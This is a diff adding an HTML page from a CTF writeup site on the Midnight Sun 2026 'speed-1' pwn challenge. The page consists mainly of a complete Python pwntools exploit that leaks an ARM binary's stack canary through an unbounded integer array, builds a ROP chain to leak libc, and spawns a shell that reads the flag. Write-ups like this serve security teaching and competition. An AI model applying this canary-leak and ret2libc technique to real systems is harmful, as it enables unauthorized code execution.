@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>speed-1 | W4llz Writeups</title>
+  <link rel="stylesheet" href="/public/writeups.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;900&family=Space+Grotesk:wght@400;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="scanlines"></div>
+  <div class="glow-orb one"></div>
+  <div class="glow-orb two"></div>
+
+  <div class="site-shell">
+    <nav class="site-nav">
+      <div class="nav-inner">
+        <a class="brand" href="/">
+          <div class="brand-mark">W</div>
+          <div class="brand-text">
+            <div class="brand-name">W4llz</div>
+            <div class="brand-subtitle">CTF Writeups</div>
+          </div>
+        </a>
+        <div class="nav-links">
+          <a href="/">Home</a>
+          <a href="/c/midnight-sun-ctf-2026-quals/">Competitions</a>
+          <a href="https://github.com/z68d/z68d.github.io">GitHub</a>
+        </div>
+      </div>
+    </nav>
+
+    <main class="container">
+      
+<div class="topbar"><a href="/c/midnight-sun-ctf-2026-quals/cat/pwn/">← Back to category</a></div>
+<section class="hero compact">
+  <div class="hero-grid"></div>
+  <div class="hero-content">
+    <div class="eyebrow"><span class="pulse-dot"></span> writeup</div>
+    <h1>speed-1</h1>
+    <p>First three flags get podium points, everyone else gets 50.</p>
+  </div>
+</section>
+
+<div class="writeup-page">
+  <div class="writeup-card">
+    
+<div class="overview-grid">
+  <div><span>Name:</span> speed-1</div>
+  <div><span>Author:</span> tor</div>
+  <div><span>Category:</span> pwn</div>
+  <div><span>Flag format:</span> midnight{...}</div>
+  <div><span>Objective:</span> Exploit the ARM 32-bit binary to gain code execution on the remote service and read the flag.</div>
+</div>
+
+  </div>
+
+  <article class="writeup-card prose">
+    <h1>speed-1</h1>
+<h2>Challenge Overview</h2>
+<p>Name: speed-1</p>
+<p>Author: tor</p>
+<p>Category: pwn</p>
+<p>Description: First three flags get podium points, everyone else gets 50.</p>
+<p>Flag format: midnight{...}</p>
+<p>Objective: Exploit the ARM 32-bit binary to gain code execution on the remote service and read the flag.</p>
+<h2>Files Provided</h2>
+<ul>
+<li>speed1</li>
+<li>libc.so.6</li>
+<li>ld-linux.so.3</li>
+</ul>
+<h2>Solution Plan</h2>
+<p>1. Inspect the binary protections and program logic.</p>
+<p>2. Identify the stack-based integer array overflow and use the out-of-bounds sum to leak the stack canary.</p>
+<p>3. Build an ARM ROP chain using the leaked canary, leak a libc address, calculate libc base, then call <code>system(&quot;/bin/sh&quot;)</code>.</p>
+<p>4. Read the flag from the remote service.</p>
+<h2>Code (Exploit Script)</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+import re
+import time
+
+HOST = &quot;speed1.play.ctf.se&quot;
+PORT = 2769
+
+context.clear(arch=&quot;arm&quot;, os=&quot;linux&quot;, log_level=&quot;info&quot;)
+
+elf = ELF(&quot;./speed1/speed1&quot;, checksec=False)
+libc = ELF(&quot;./speed1/libc.so.6&quot;, checksec=False)
+
+POP_MULTI = 0x1085c
+CSU_CALL = 0x10840
+MAIN = 0x10698
+
+PUTS_GOT = elf.got[&quot;puts&quot;]
+PUTS_OFF = libc.sym[&quot;puts&quot;]
+
+POP_R0_R5_R6_PC_THUMB = 0x17c18 + 1
+SYSTEM = libc.sym[&quot;system&quot;]
+BINSH = next(libc.search(b&quot;/bin/sh&quot;))
+
+ansi_re = re.compile(rb&quot;\x1b\[[0-9;]*m&quot;)
+
+def s32(x):
+    x &amp;= 0xffffffff
+    return x - 0x100000000 if x &amp; 0x80000000 else x
+
+def linevals(vals):
+    return b&quot;&quot;.join(str(s32(v)).encode() + b&quot;\n&quot; for v in vals)
+
+def conn():
+    io = remote(HOST, PORT, timeout=4)
+    io.recvuntil(b&quot;num:&quot;)
+    return io
+
+def leak_canary():
+    io = conn()
+    io.send(linevals([1] * 16 + [0]))
+    out = io.recvall(timeout=2)
+    io.close()
+
+    clean = ansi_re.sub(b&quot;&quot;, out)
+    m = re.search(rb&quot;res:\s*(-?\d+)&quot;, clean)
+    if not m:
+        return None
+
+    return (int(m.group(1)) - 16) &amp; 0xffffffff
+
+def leak_puts(canary):
+    vals = [1] * 16
+    vals += [canary, 1, POP_MULTI]
+    vals += [1, PUTS_GOT - 4, 1, PUTS_GOT, 1, 1, 1, CSU_CALL]
+    vals += [1, 1, 1, 1, 1, 1, 1, MAIN]
+    vals += [0]
+
+    io = conn()
+    io.send(linevals(vals))
+
+    data = io.recvuntil(b&quot;res:&quot;, timeout=4)
+    data += io.recvuntil(b&quot;num:&quot;, timeout=4)
+    clean = ansi_re.sub(b&quot;&quot;, data)
+
+    idx = clean.find(b&quot;res:&quot;)
+    nl = clean.find(b&quot;\n&quot;, idx)
+    leakline = clean[nl + 1:]
+    raw = leakline.split(b&quot;\n&quot;, 1)[0]
+
+    puts_addr = u32(raw[:4])
+    return io, puts_addr
+
+def get_flag(io, canary, libc_base):
+    pop = libc_base + POP_R0_R5_R6_PC_THUMB
+    system = libc_base + SYSTEM
+    binsh = libc_base + BINSH
+
+    vals = [1] * 16
+    vals += [canary, 1, pop, binsh, 1, 1, system, 0]
+
+    io.send(linevals(vals))
+    time.sleep(0.2)
+    io.sendline(b&quot;cat flag* /flag* 2&gt;/dev/null; exit&quot;)
+    return io.recvall(timeout=4)
+
+for attempt in range(80):
+    canary = leak_canary()
+    if canary is None:
+        continue
+
+    try:
+        io, puts_addr = leak_puts(canary)
+        libc_base = (puts_addr - PUTS_OFF) &amp; 0xffffffff
+        out = get_flag(io, canary, libc_base)
+
+        print(out.decode(&quot;latin1&quot;, &quot;replace&quot;))
+
+        m = re.search(rb&quot;midnight\{[^}\n]+\}&quot;, out)
+        if m:
+            print(m.group(0).decode())
+            break
+    except Exception:
+        try:
+            io.close()
+        except Exception:
+            pass</code></pre>
+<h2>Flag</h2>
+<pre><code class="language-txt">midnight{1f762ebc504b1d331c2d2ef8aafd0b67}</code></pre>
+<h2>Notes</h2>
+<p>The binary is an ARM 32-bit executable with NX and a stack canary enabled. The program stores parsed integers into a fixed stack array until <code>0</code> is entered, but it does not enforce a length limit. Sending 16 values fills the array, and the later sum reads one word past the array, leaking the canary. The exploit then preserves the canary, uses ROP to leak <code>puts</code>, calculates libc base, and calls <code>system(&quot;/bin/sh&quot;)</code>.</p>
+  </article>
+</div>
+
+    </main>
+  </div>
+</body>
+</html>
